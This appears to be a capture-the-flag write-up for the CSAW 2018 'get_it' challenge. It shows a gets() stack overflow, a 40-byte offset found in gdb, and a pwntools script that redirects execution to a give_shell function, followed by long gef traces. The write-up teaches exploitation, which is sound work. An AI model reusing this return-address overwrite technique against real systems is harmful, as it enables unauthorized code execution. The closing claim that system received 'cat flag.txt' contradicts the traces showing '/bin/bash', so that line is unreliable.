# Csaw Quals 2018 Get It

Let's take a look at the binary:

```
$    file get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
$    pwn checksec get_it
[*] '/Hackery/pod/modules/bof_callfunction/csaw18_getit/get_it'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./get_it
Do you gets it??
15935728
```

So we can see that we are given a `64` bit binary, with a Non-Executable stack (that mitigation will be covered later). When we run it, we see that it prompts us for input. When we take a look at the main function in Ghidra, we see this:

```
undefined8 main(void)

{
  char input [32];
 
  puts("Do you gets it??");
  gets(input);
  return 0;
}
```

So we can see that it makes a call to the `gets` function with the char buffer `input` as an argument. This is a bug. The thing about the `gets` function, is that there is no size restriction on the amount of data it will scan in. It will just scan in data until it gets either a newline character or EOF (or something causes it to crash). Because if this we can write more data to `input` than it can hold (which it can hold `32` bytes worth of data) and we will overflow it. The data that we overflow will start overwriting subsequent things in memory. Looking at this function we don't see any other variables that we can overwrite. However we can definitely overwrite the saved return address.

When a function is called, two values that are saved are the base pointer (points to the base of the stack) and instruction pointer (pointing to the instruction following the call). This way when the function is done executing and returns, code execution can pick up where it left off and the code knows where the stack is. These values make up the saved base pointer and saved return address, and in x64 the saved base pointer is stored at `rbp+0x0` and the saved instruction pointer is stored at `rbp+0x8`.

So when the `ret` instruction, the saved instruction pointer (stored at `rbp+0x8`) is executed. This address is on the stack, and we can reach it with the `gets` function call. So we will just overwrite it with a value we want, and we will decide what code the program executes. The offset between the start of our input and the return address is `40` bytes. The first `32` bytes come from the `input` char buffer we have to fill up. After that we can see there are no variables between `input` and the saved base pointer (if there was a stack canary that would be a different story, but I'll save that for later). After that we have `8` bytes for the saved base pointer, then we reach the saved instruction pointer. We can also see this in memory with gdb:

```
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004005c7 <+0>:    push   rbp
   0x00000000004005c8 <+1>:    mov    rbp,rsp
   0x00000000004005cb <+4>:    sub    rsp,0x30
   0x00000000004005cf <+8>:    mov    DWORD PTR [rbp-0x24],edi
   0x00000000004005d2 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004005d6 <+15>:    mov    edi,0x40068e
   0x00000000004005db <+20>:    call   0x400470 <puts@plt>
   0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
   0x00000000004005e4 <+29>:    mov    rdi,rax
   0x00000000004005e7 <+32>:    mov    eax,0x0
   0x00000000004005ec <+37>:    call   0x4004a0 <gets@plt>
   0x00000000004005f1 <+42>:    mov    eax,0x0
   0x00000000004005f6 <+47>:    leave  
   0x00000000004005f7 <+48>:    ret    
End of assembler dump.
gef➤  b *0x4005f1
Breakpoint 1 at 0x4005f1
gef➤  r
Starting program: /Hackery/pod/modules/bof_callfunction/csaw18_getit/get_it
Do you gets it??
15935728
```

We set a breakpoint for right after the `gets` call:

```
Breakpoint 1, 0x00000000004005f1 in main ()
gef➤  i f
Stack level 0, frame at 0x7fffffffdea0:
 rip = 0x4005f1 in main; saved rip = 0x7ffff7a05b97
 Arglist at 0x7fffffffde90, args:
 Locals at 0x7fffffffde90, Previous frame's sp is 0x7fffffffdea0
 Saved registers:
  rbp at 0x7fffffffde90, rip at 0x7fffffffde98
gef➤  x/g $rbp+0x8
0x7fffffffde98:    0x00007ffff7a05b97
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602670 - 0x602678  →   "15935728"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde70 - 0x7fffffffde78  →   "15935728"
```

So we can see that the return address i stored at `0x7fffffffde98`. Our input begins at `0x7fffffffde70`. This gives us a `0x7fffffffde98 - 0x7fffffffde70 = 0x28` byte offset (`0x28 = 40`). So we just have to write `40` bytes worth of input and we can write over the return address. That address will be executed when the `ret` instruction is executed, giving us code execution. The question is now what do we want to execute? Looking through the list of functions in Ghidra, we see that there is a `give_shell` function:

```
void give_shell(void)

{
  system("/bin/bash");
  return;
}
```

This function looks like it just gives us a shell by calling `system("/bin/bash")`. In the assembly viewer we can see that it starts at `0x4005b6`. So we can just call the `give_shell` function by writing over the return address with `0x4005b6` and that should give us a shell. Putting it all together, we get the following exploit:

```
from pwn import *

target = process("./get_it")
gdb.attach(target, gdbscript = 'b *0x4005f1')

input()

payload = b""
payload += b"0"*40 # Padding to the return address
payload += p64(0x4005b6) # Address of give_shell in least endian, will be new saved return address

# Send the payload
target.sendline(payload)

# Drop to an interactive shell to use the new shell
target.interactive()
```


So one thing about this particular challenge. If you run the explouit on more modern versions of Ubuntu, it will probably crash. With pwning, we sometimes run into weird problems caused by the enviornment we run the binary on. This is one of those. Depending on the version of Ubuntu we run this on, this exploit will or will not work. I believe this is because of a stack alignment issue. Also the purpose of the `input()` is to pause the exploit, to give gdb time to set the breakpoint. We will have to just press enter on the exploit to get past it.

I would say the important thing is, as long as call the `give_shell` function is called, we should consider this challenge was solved. That is the actual intended solution for this challenge:

```
Breakpoint 1, 0x00000000004005f1 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007ffd87b5b3e0  →  0x3030303030303030 ("00000000"?)
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007fd1f98be980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffd87b5b3d0  →  0x007ffd87b5b4f8  →  0x007ffd87b5c413  →  "./get_it"
$rbp   : 0x007ffd87b5b400  →  0x3030303030303030 ("00000000"?)
$rsi   : 0x000000006b86b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007fd1f98c07f0  →  0x0000000000000000
$rip   : 0x000000004005f1  →  <main+42> mov eax, 0x0
$r8    : 0x007ffd87b5b3e0  →  0x3030303030303030 ("00000000"?)
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffd87b5b4f0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x007ffd87b5b3d0│+0x0000: 0x007ffd87b5b4f8  →  0x007ffd87b5c413  →  "./get_it"   ← $rsp
0x007ffd87b5b3d8│+0x0008: 0x0000000100400600
0x007ffd87b5b3e0│+0x0010: 0x3030303030303030     ← $rax, $r8
0x007ffd87b5b3e8│+0x0018: 0x3030303030303030
0x007ffd87b5b3f0│+0x0020: 0x3030303030303030
0x007ffd87b5b3f8│+0x0028: 0x3030303030303030
0x007ffd87b5b400│+0x0030: 0x3030303030303030     ← $rbp
0x007ffd87b5b408│+0x0038: 0x000000004005b6  →  <give_shell+0> push rbp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005e4 <main+29>        mov    rdi, rax
     0x4005e7 <main+32>        mov    eax, 0x0
     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
●→   0x4005f1 <main+42>        mov    eax, 0x0
     0x4005f6 <main+47>        leave  
     0x4005f7 <main+48>        ret    
     0x4005f8                  nop    DWORD PTR [rax+rax*1+0x0]
     0x400600 <__libc_csu_init+0> push   r15
     0x400602 <__libc_csu_init+2> push   r14
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005f1 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f1 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005f6 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007fd1f98be980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffd87b5b3d0  →  0x007ffd87b5b4f8  →  0x007ffd87b5c413  →  "./get_it"
$rbp   : 0x007ffd87b5b400  →  0x3030303030303030 ("00000000"?)
$rsi   : 0x000000006b86b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007fd1f98c07f0  →  0x0000000000000000
$rip   : 0x000000004005f6  →  <main+47> leave 
$r8    : 0x007ffd87b5b3e0  →  0x3030303030303030 ("00000000"?)
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffd87b5b4f0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffd87b5b3d0│+0x0000: 0x007ffd87b5b4f8  →  0x007ffd87b5c413  →  "./get_it"   ← $rsp
0x007ffd87b5b3d8│+0x0008: 0x0000000100400600
0x007ffd87b5b3e0│+0x0010: 0x3030303030303030     ← $r8
0x007ffd87b5b3e8│+0x0018: 0x3030303030303030
0x007ffd87b5b3f0│+0x0020: 0x3030303030303030
0x007ffd87b5b3f8│+0x0028: 0x3030303030303030
0x007ffd87b5b400│+0x0030: 0x3030303030303030     ← $rbp
0x007ffd87b5b408│+0x0038: 0x000000004005b6  →  <give_shell+0> push rbp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005e7 <main+32>        mov    eax, 0x0
     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
●    0x4005f1 <main+42>        mov    eax, 0x0
 →   0x4005f6 <main+47>        leave  
     0x4005f7 <main+48>        ret    
     0x4005f8                  nop    DWORD PTR [rax+rax*1+0x0]
     0x400600 <__libc_csu_init+0> push   r15
     0x400602 <__libc_csu_init+2> push   r14
     0x400604 <__libc_csu_init+4> mov    r15d, edi
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005f6 in main (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f6 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005f7 in main ()










[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007fd1f98be980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffd87b5b408  →  0x000000004005b6  →  <give_shell+0> push rbp
$rbp   : 0x3030303030303030 ("00000000"?)
$rsi   : 0x000000006b86b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007fd1f98c07f0  →  0x0000000000000000
$rip   : 0x000000004005f7  →  <main+48> ret 
$r8    : 0x007ffd87b5b3e0  →  0x3030303030303030 ("00000000"?)
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffd87b5b4f0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffd87b5b408│+0x0000: 0x000000004005b6  →  <give_shell+0> push rbp   ← $rsp
0x007ffd87b5b410│+0x0008: 0x0000000200000000
0x007ffd87b5b418│+0x0010: 0x007ffd87b5b4f8  →  0x007ffd87b5c413  →  "./get_it"
0x007ffd87b5b420│+0x0018: 0x00000001f98ba7a0
0x007ffd87b5b428│+0x0020: 0x000000004005c7  →  <main+0> push rbp
0x007ffd87b5b430│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffd87b5b438│+0x0030: 0x1988bf93d0d0019e
0x007ffd87b5b440│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
●    0x4005f1 <main+42>        mov    eax, 0x0
     0x4005f6 <main+47>        leave  
 →   0x4005f7 <main+48>        ret    
   ↳    0x4005b6 <give_shell+0>   push   rbp
        0x4005b7 <give_shell+1>   mov    rbp, rsp
        0x4005ba <give_shell+4>   mov    edi, 0x400684
        0x4005bf <give_shell+9>   call   0x400480 <system@plt>
        0x4005c4 <give_shell+14>  nop    
        0x4005c5 <give_shell+15>  pop    rbp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005f7 in main (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f7 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005b6 in give_shell ()









[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007fd1f98be980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffd87b5b410  →  0x0000000200000000
$rbp   : 0x3030303030303030 ("00000000"?)
$rsi   : 0x000000006b86b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007fd1f98c07f0  →  0x0000000000000000
$rip   : 0x000000004005b6  →  <give_shell+0> push rbp
$r8    : 0x007ffd87b5b3e0  →  0x3030303030303030 ("00000000"?)
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffd87b5b4f0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffd87b5b410│+0x0000: 0x0000000200000000     ← $rsp
0x007ffd87b5b418│+0x0008: 0x007ffd87b5b4f8  →  0x007ffd87b5c413  →  "./get_it"
0x007ffd87b5b420│+0x0010: 0x00000001f98ba7a0
0x007ffd87b5b428│+0x0018: 0x000000004005c7  →  <main+0> push rbp
0x007ffd87b5b430│+0x0020: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffd87b5b438│+0x0028: 0x1988bf93d0d0019e
0x007ffd87b5b440│+0x0030: 0x000000004004c0  →  <_start+0> xor ebp, ebp
0x007ffd87b5b448│+0x0038: 0x007ffd87b5b4f0  →  0x0000000000000001
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005ae <frame_dummy+30> call   rax
     0x4005b0 <frame_dummy+32> pop    rbp
     0x4005b1 <frame_dummy+33> jmp    0x400530 <register_tm_clones>
 →   0x4005b6 <give_shell+0>   push   rbp
     0x4005b7 <give_shell+1>   mov    rbp, rsp
     0x4005ba <give_shell+4>   mov    edi, 0x400684
     0x4005bf <give_shell+9>   call   0x400480 <system@plt>
     0x4005c4 <give_shell+14>  nop    
     0x4005c5 <give_shell+15>  pop    rbp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005b6 in give_shell (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005b6 → give_shell()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005b7 in give_shell ()










[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007fd1f98be980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffd87b5b408  →  "00000000"
$rbp   : 0x3030303030303030 ("00000000"?)
$rsi   : 0x000000006b86b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007fd1f98c07f0  →  0x0000000000000000
$rip   : 0x000000004005b7  →  <give_shell+1> mov rbp, rsp
$r8    : 0x007ffd87b5b3e0  →  "000000000000000000000000000000000000000000000000"
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffd87b5b4f0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffd87b5b408│+0x0000: "00000000"     ← $rsp
0x007ffd87b5b410│+0x0008: 0x0000000200000000
0x007ffd87b5b418│+0x0010: 0x007ffd87b5b4f8  →  0x007ffd87b5c413  →  "./get_it"
0x007ffd87b5b420│+0x0018: 0x00000001f98ba7a0
0x007ffd87b5b428│+0x0020: 0x000000004005c7  →  <main+0> push rbp
0x007ffd87b5b430│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffd87b5b438│+0x0030: 0x1988bf93d0d0019e
0x007ffd87b5b440│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005b0 <frame_dummy+32> pop    rbp
     0x4005b1 <frame_dummy+33> jmp    0x400530 <register_tm_clones>
     0x4005b6 <give_shell+0>   push   rbp
 →   0x4005b7 <give_shell+1>   mov    rbp, rsp
     0x4005ba <give_shell+4>   mov    edi, 0x400684
     0x4005bf <give_shell+9>   call   0x400480 <system@plt>
     0x4005c4 <give_shell+14>  nop    
     0x4005c5 <give_shell+15>  pop    rbp
     0x4005c6 <give_shell+16>  ret    
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005b7 in give_shell (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005b7 → give_shell()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005ba in give_shell ()










[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007fd1f98be980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffd87b5b408  →  "00000000"
$rbp   : 0x007ffd87b5b408  →  "00000000"
$rsi   : 0x000000006b86b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007fd1f98c07f0  →  0x0000000000000000
$rip   : 0x000000004005ba  →  <give_shell+4> mov edi, 0x400684
$r8    : 0x007ffd87b5b3e0  →  "000000000000000000000000000000000000000000000000"
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffd87b5b4f0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffd87b5b408│+0x0000: "00000000"     ← $rsp, $rbp
0x007ffd87b5b410│+0x0008: 0x0000000200000000
0x007ffd87b5b418│+0x0010: 0x007ffd87b5b4f8  →  0x007ffd87b5c413  →  "./get_it"
0x007ffd87b5b420│+0x0018: 0x00000001f98ba7a0
0x007ffd87b5b428│+0x0020: 0x000000004005c7  →  <main+0> push rbp
0x007ffd87b5b430│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffd87b5b438│+0x0030: 0x1988bf93d0d0019e
0x007ffd87b5b440│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005b1 <frame_dummy+33> jmp    0x400530 <register_tm_clones>
     0x4005b6 <give_shell+0>   push   rbp
     0x4005b7 <give_shell+1>   mov    rbp, rsp
 →   0x4005ba <give_shell+4>   mov    edi, 0x400684
     0x4005bf <give_shell+9>   call   0x400480 <system@plt>
     0x4005c4 <give_shell+14>  nop    
     0x4005c5 <give_shell+15>  pop    rbp
     0x4005c6 <give_shell+16>  ret    
     0x4005c7 <main+0>         push   rbp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005ba in give_shell (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005ba → give_shell()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005bf in give_shell ()










[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007fd1f98be980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffd87b5b408  →  "00000000"
$rbp   : 0x007ffd87b5b408  →  "00000000"
$rsi   : 0x000000006b86b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x00000000400684  →  "/bin/bash"
$rip   : 0x000000004005bf  →  <give_shell+9> call 0x400480 <system@plt>
$r8    : 0x007ffd87b5b3e0  →  "000000000000000000000000000000000000000000000000"
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffd87b5b4f0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffd87b5b408│+0x0000: "00000000"     ← $rsp, $rbp
0x007ffd87b5b410│+0x0008: 0x0000000200000000
0x007ffd87b5b418│+0x0010: 0x007ffd87b5b4f8  →  0x007ffd87b5c413  →  "./get_it"
0x007ffd87b5b420│+0x0018: 0x00000001f98ba7a0
0x007ffd87b5b428│+0x0020: 0x000000004005c7  →  <main+0> push rbp
0x007ffd87b5b430│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffd87b5b438│+0x0030: 0x1988bf93d0d0019e
0x007ffd87b5b440│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005b6 <give_shell+0>   push   rbp
     0x4005b7 <give_shell+1>   mov    rbp, rsp
     0x4005ba <give_shell+4>   mov    edi, 0x400684
 →   0x4005bf <give_shell+9>   call   0x400480 <system@plt>
   ↳    0x400480 <system@plt+0>   jmp    QWORD PTR [rip+0x200b9a]        # 0x601020 <system@got.plt>
        0x400486 <system@plt+6>   push   0x1
        0x40048b <system@plt+11>  jmp    0x400460
        0x400490 <__libc_start_main@plt+0> jmp    QWORD PTR [rip+0x200b92]        # 0x601028 <__libc_start_main@got.plt>
        0x400496 <__libc_start_main@plt+6> push   0x2
        0x40049b <__libc_start_main@plt+11> jmp    0x400460
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
system@plt (
   $rdi = 0x00000000400684 → "/bin/bash"
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005bf in give_shell (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005bf → give_shell()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

So there in gdb, we see that `give_shell` was called, which called `system` with `"cat flag.txt"`, which was the intended solution.
